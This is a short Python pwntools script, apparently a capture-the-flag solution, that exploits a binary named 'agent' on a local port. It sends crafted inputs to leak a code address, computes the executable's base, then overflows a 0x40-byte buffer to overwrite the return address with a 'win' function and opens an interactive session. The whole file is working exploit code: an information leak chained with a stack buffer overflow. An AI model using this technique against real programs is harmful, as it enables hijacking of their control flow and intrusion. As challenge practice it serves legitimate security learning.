from pwn import *

elf = ELF("../dist/agent")
libc = ELF('../dist/libc-2.31.so')

io = remote("localhost", 30005)
# io = process("../dist/agent")

io.sendlineafter(b"Name > ", b"A"*0x1)
io.sendlineafter(b"Words > ", b"B"*0x1)
io.sendlineafter(b"Age > ", b"256")
io.sendlineafter(b"Job > ", b"C" * (0x10 - 3) + b"END")\

#pause()
# leak text addr
io.recvuntil(b"END")

text_addr = io.recvline()[:-1]
text_addr = u64(text_addr + b"\x00" * (8 - len(text_addr)))
text_base = text_addr - 0x12c9
print("text base is {}".format(hex(text_base)))

win_addr = text_base + elf.symbols['win']
payload = b"A" * 0x40

# align stack
payload += p64(win_addr + 5)

io.sendlineafter(b"> ", b'4')
io.sendlineafter(b"> ", payload)
io.interactive()
